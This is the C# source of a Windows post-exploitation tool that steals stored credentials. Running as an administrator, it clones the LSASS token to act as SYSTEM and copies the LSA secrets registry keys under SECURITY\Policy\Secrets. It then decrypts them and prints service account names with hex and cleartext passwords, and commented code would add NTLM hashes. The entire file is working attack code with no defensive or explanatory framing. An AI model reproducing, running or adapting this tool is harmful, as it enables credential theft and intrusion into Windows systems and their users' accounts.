using System;
using System.Management;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using Microsoft.Win32;



namespace utilities
{
    class GetSecrets
    {
        static void Main(string[] args)
        {
            if (IntPtr.Size == 8)
            {
                Console.WriteLine("Running as 64bit process.  This needs to be a 32bit process.  Exiting");
                Environment.Exit(1);
            }

            WindowsIdentity windowsIdentity = WindowsIdentity.GetCurrent();
            Boolean isUserSystem = windowsIdentity.IsSystem;
            WindowsPrincipal principal = new WindowsPrincipal(windowsIdentity);
            Boolean isUserAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);

            if (!isUserSystem)
            {
                if (isUserAdmin)
                {
                    Console.WriteLine("[*] Cloning LSASS Token...");
                    try
                    {
                        CloneToken.DuplicateToken("lsass");
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("[!] Exiting due to error: " + e.ToString());
                        Environment.Exit(1);
                        ;
                    }
                }
                else
                {
                    Console.WriteLine("[!] Either need to run as Admin or SYSTEM.  Exiting");
                    Environment.Exit(1);
                }
            }

            RegistryKey rkm = Registry.LocalMachine;

            RegistryKey secretKeys = rkm.OpenSubKey("SECURITY\\Policy\\Secrets");

            String myKey = "MySecret";
            String tempRegPath = "HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets\\" + myKey;

            Console.WriteLine("[*] Starting duplicate the LSA registry keys...");
            Console.WriteLine("");
            foreach (String tokenA in secretKeys.GetSubKeyNames())
            {
                RegistryKey subKey = rkm.OpenSubKey("SECURITY\\Policy\\Secrets\\" + tokenA);

                // Retrieve all the subkeys for the specified key and copy them
                String[] names = subKey.GetSubKeyNames();
                Registry.SetValue(tempRegPath, "", Registry.GetValue(subKey.Name, "", ""));
                foreach (String s in names)
                {
                    Registry.SetValue(tempRegPath + "\\" + s, "", Registry.GetValue(subKey.Name + "\\" + s, "", ""));
                }

                LSAUtility lsaUtil = new LSAUtility(myKey);

                string value;
                string hexadecimal;
                string ntlm;
                try
                {
                    (value,hexadecimal) = lsaUtil.GetSecret();
                    // Uncomment the line below to calculate the ntlm hash (require BouncyCastle.Crypto.dll)
                    //ntlm = MD4.hex_to_ntlm(hexadecimal);
                }
                catch
                {
                    continue;
                }

                string account = "";
                if (tokenA.StartsWith("_SC_"))
                {
                    String serviceName = tokenA.Replace("_SC_", "");
                    Console.WriteLine("[*] Searching for {0} service", serviceName);

                    String foo = $"Win32_Service.Name='{serviceName}'";
                    ManagementObject serviceObj = new ManagementObject(foo);
                    account = serviceObj.GetPropertyValue("StartName").ToString();

                }

                Console.WriteLine("");
                Console.WriteLine("[+] Key: " + subKey.Name + "\n" +
                                  "          Account             : " + account + "\n" +
                                  "          Password Hex        : " + hexadecimal + "\n" +
                                  // Uncomment the line below to print the ntlm hash (require BouncyCastle.Crypto.dll)
                                  // "          NTLM hash           : " + ntlm + "\n" +
                                  "          Clear text password : " + value);
            }

            rkm.DeleteSubKeyTree("SECURITY\\Policy\\Secrets\\MySecret");
            Console.WriteLine("");
            Console.WriteLine("[*] Cloning secrets finished...");
            Console.WriteLine("[!] Decode Hex password using `decrypt_hex.py $HEX`");
            Console.WriteLine("");
        }

    }
}

